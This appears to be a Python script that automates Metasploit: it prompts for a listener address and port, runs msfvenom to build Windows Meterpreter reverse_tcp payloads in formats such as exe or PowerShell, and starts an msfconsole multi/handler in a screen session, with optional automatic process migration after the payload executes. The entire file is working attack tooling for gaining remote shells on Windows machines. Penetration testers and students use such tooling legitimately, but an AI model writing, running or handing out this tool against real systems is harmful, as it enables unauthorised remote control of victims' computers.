#!/usr/bin/env python3
# File name          : remote.py
# Author             : IllmaticJV
# Date created       : 17 Apr 2023

import os
import subprocess
import time
from colorama import init, Fore

def intro():

    print("  _____  _            _  _                   _        __          __                                                             ")
    print(" / ____|| |          | || |                 | |       \ \        / /                                                             ")
    print("| (___  | |__    ___ | || |  ___   ___    __| |  ___   \ \  /\  / /  _ __   __ _  _ __   _ __    ___  _ __                       ")
    print(" \___ \ | '_ \  / _ \| || | / __| / _ \  / _` | / _ \   \ \/  \/ /  | '__| / _` || '_ \ | '_ \  / _ \| '__|                      ")
    print(" ____) || | | ||  __/| || || (__ | (_) || (_| ||  __/    \  /\  /   | |   | (_| || |_) || |_) ||  __/| |                         ")
    print("|_____/ |_| |_| \___||_||_| \___| \___/  \__,_| \___|     \/  \/    |_|    \__,_|| .__/ | .__/  \___||_|                         ")
    print("                                                                                 | |    | |                                      ")
    print("                                                                                 |_|    |_|                                      ")
    print(" __  __        _                       _         _  _     ______                                                       _         ")
    print("|  \/  |      | |                     | |       (_)| |   |  ____|                                                     | |        ")
    print("| \  / |  ___ | |_   __ _  ___  _ __  | |  ___   _ | |_  | |__    _ __   __ _  _ __ ___    ___ __      __  ___   _ __ | | __     ")
    print("| |\/| | / _ \| __| / _` |/ __|| '_ \ | | / _ \ | || __| |  __|  | '__| / _` || '_ ` _ \  / _ \\ \ /\ / / / _ \ | '__|| |/ /     ")
    print("| |  | ||  __/| |_ | (_| |\__ \| |_) || || (_) || || |_  | |     | |   | (_| || | | | | ||  __/ \ V  V / | (_) || |   |   <      ")
    print("|_|  |_| \___| \__| \__,_||___/| .__/ |_| \___/ |_| \__| |_|     |_|    \__,_||_| |_| |_| \___|  \_/\_/   \___/ |_|   |_|\_\     ")
    print("                               | |                                                                                               ")
    print("                               |_|                                                                                               ")
    print("                                                                                                       Created by IllmaticJV     ")
    print("                                                                                                                                 ")

def generate_payload(lhost, lport, arch, format, staged, output_path):
# Generate the payload using msfvenom
    if arch == '32':
        if staged == 'y':
            payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -a x86 -f {format} -o {output_path}"
        else:
            payload = f"msfvenom -p windows/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -a x86 -f {format} -o {output_path}"
    elif arch == '64':
        if staged == 'y':
            payload = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f {format} -o {output_path}"
        else:
            payload = f"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f {format} -o {output_path}"
    else:
        print("Invalid architecture.")
        exit()
    #Execute the msfvenom payload command and handle errors
    msfvenom_process = subprocess.Popen(payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = msfvenom_process.communicate()
    if msfvenom_process.returncode != 0:
        print("\033[91m[-] Error generating payload:\033[0m")
        print(stderr.decode())
        exit()
    #Print the shellcode path in color
    print("\033[92m[+] Payload generated successfully:\033[0m")
    print(output_path)

def setup_handlers(migrate):
    mig = ""
    if migrate == 'y':
        mig += "set InitialAutoRunScript post/windows/manage/migrate;set AutoRunScript post/windows/manage/migrate;"

    # Start a new GNU Screen session and create a handler for the payload
    if arch == '32':
        if staged == 'y':
            command = f"msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST {lhost};set LPORT {lport};set ExitOnSession false;{mig}run -j;\""
        else:
            command = f"msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/meterpreter_reverse_tcp;set LHOST {lhost};set LPORT {lport};set ExitOnSession false;{mig}run -j;\""
    elif arch == '64':
        if staged == 'y':
            command = f"msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST {lhost};set LPORT {lport};set ExitOnSession false;{mig}run -j;\""
        else:
            command = f"msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter_reverse_tcp;set LHOST {lhost};set LPORT {lport};set ExitOnSession false;{mig}run -j;\""
    return command

def start_screen_session(session_name, command):
    # Check if a screen session with the same name exists
    output = os.popen(f"screen -ls | grep {session_name}").read()
    if output.strip():
        # If a session exists, ask the user if they want to kill it
        print(f"A screen session with name {session_name} already exists.")
        answer = input("Do you want to kill it and start a new session? (y/n): ")
        if answer.lower() == "y":
            kill_screen_session(session_name)
        else:
            return
    # Start a new screen session to setup handler
    screen_cmd = f"screen -dmS {session_name} -h 0 bash -c 'stty sane;{command}'"
    subprocess.Popen(screen_cmd, shell=True)
    ####VERIFY IF SCREEN STARTED
    time.sleep(5)
    output = os.popen(f"screen -ls | grep {session_name}").read()
    if output.strip():
        print("Handler created. To access the handler, run \033[92mscreen -r msf_handler\033[0m")
    else:
        print("Handler does not seem to be setup properly")

def kill_screen_session(session_name):
    os.system(f"screen -ls | grep {session_name} | cut -d. -f1 | awk '{{print $1}}' | xargs kill")

def attach_to_screen(session_name):
    os.system(f"screen -r {session_name}")

if __name__ == "__main__":
    init() # initialize colorama
    intro()
    # Prompt user for payload information
    lhost = input("Enter the LHOST for the payload: ")
    lport = input("Enter the LPORT for the payload: ")
    arch = input("Enter the architecture (32 or 64): ")
    output_format = input("Enter the output file format (exe, csharp, ps1, etc.): ")
    staged = input("Do you want a staged payload? (y/n): ")
    migrate = input("Do you want to migrate the process after the payload is executed? (y/n): ")
    output_path = input("Enter the output path for the shellcode (press enter to use current folder): ")
    if not output_path:
        output_path = "./shellcode"
    generate_payload(lhost, lport, arch, output_format, staged, output_path)
    command = setup_handlers(migrate)
    session_name = "msf_handler"
    start_screen_session(session_name, command)
    exit
